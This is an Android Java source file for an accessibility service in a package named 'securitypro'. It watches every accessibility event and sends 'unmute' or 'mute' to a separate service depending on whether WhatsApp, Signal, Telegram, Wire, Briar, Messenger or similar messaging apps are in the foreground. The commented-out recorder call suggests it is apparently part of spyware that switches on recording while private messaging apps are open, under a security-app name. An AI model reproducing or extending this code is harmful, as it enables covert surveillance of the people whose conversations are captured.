package com.securitypro.proapp.Accessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.securitypro.proapp.Service.appService;

import java.util.HashSet;


public class Acc extends AccessibilityService {

    private HashSet<String> arr;


    @Override
    public AccessibilityNodeInfo findFocus(int focus) {
        return super.findFocus(focus);
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        return super.onKeyEvent(event);
    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) throws RuntimeException {

        CharSequence packageName = event.getPackageName();

        if (arr.contains(packageName.toString())) {
            //
            startService(new Intent(this, appService.class).setAction("unmute"));
           /* Log.e("socsoc", packageName.toString());*/
        } else {
            startService(new Intent(this, appService.class).setAction("mute"));
        }

    }

    ////// following two overrides are common to both voip and chat
    @Override
    public void onInterrupt() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        initializeRecorder();
        super.onServiceConnected();
        return START_STICKY;
    }

    @Override
    public void onServiceConnected() {

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 948;
        setServiceInfo(info);

    }

    @Override
    public void onCreate() {
        super.onCreate();
        arr = new HashSet<>(2000);
        arr.add("com.whatsapp");
        arr.add("com.whatsapp.w4b");
        arr.add("org.thoughtcrime.securesms");
        arr.add("org.telegram.messenger");
        arr.add("com.wire");
        arr.add("org.briarproject.briar.android");
        arr.add("com.gbwhatsapp");
        arr.add("com.secapp.tor.conion");
        arr.add("com.facebook.orca");
        arr.add("com.facebook.katana");
        arr.add("com.enflick.android.TextNow");
    }
}

